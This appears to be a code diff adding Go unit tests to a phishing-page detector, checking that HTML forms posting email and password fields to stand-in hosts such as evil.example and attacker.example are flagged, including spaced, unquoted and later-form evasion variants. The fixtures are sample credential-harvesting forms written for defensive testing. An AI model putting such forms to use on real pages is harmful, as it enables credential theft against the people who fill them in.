@@ -58,6 +58,19 @@ func TestHasExternalFormActionSingleQuotes(t *testing.T) {
 	}
 }
 
+func TestHasExternalFormActionWhitespaceAroundEquals(t *testing.T) {
+	if !hasExternalFormAction(`<form method="post" action = "https://evil.example/login">`) {
+		t.Error("quoted action with spaces around equals should be detected")
+	}
+}
+
+func TestHasExternalFormActionScansPastRelativeForm(t *testing.T) {
+	html := `<form action="/search"></form><form method="post" action="https://evil.example/collect"></form>`
+	if !hasExternalFormAction(html) {
+		t.Error("later external form action should be detected even when first action is relative")
+	}
+}
+
 func TestHasExternalFormActionMissing(t *testing.T) {
 	if hasExternalFormAction(`<form>`) {
 		t.Error("no action attribute should not match")
@@ -869,6 +882,34 @@ func TestQuickPhishingCheckAcceptsExternalFormAction(t *testing.T) {
 	_ = os.WriteFile(path, []byte(content), 0600)
 	if !quickPhishingCheck(path) {
 		t.Error("credential form posting to external host must match")
+	}
+}
+
+func TestQuickPhishingCheckAcceptsHTMLAttributeVariants(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "verify.html")
+	content := `<html><body>
+<form action = "https://attacker.example/collect.php">
+<input TYPE = email NAME = login>
+<input type = password name = pass>
+</form>
+</body></html>`
+	_ = os.WriteFile(path, []byte(content), 0600)
+	if !quickPhishingCheck(path) {
+		t.Error("credential form with spaced/unquoted attributes posting external must match")
+	}
+}
+
+func TestQuickPhishingCheckAcceptsLaterExternalForm(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "verify.html")
+	content := `<html><body>
+<form action="/preview"><input type="text" name="query"></form>
+<form action="https://attacker.example/collect"><input type="email" name="email"><input type="password" name="password"></form>
+</body></html>`
+	_ = os.WriteFile(path, []byte(content), 0600)
+	if !quickPhishingCheck(path) {
+		t.Error("credential page with later external form must match")
 	}
 }
 
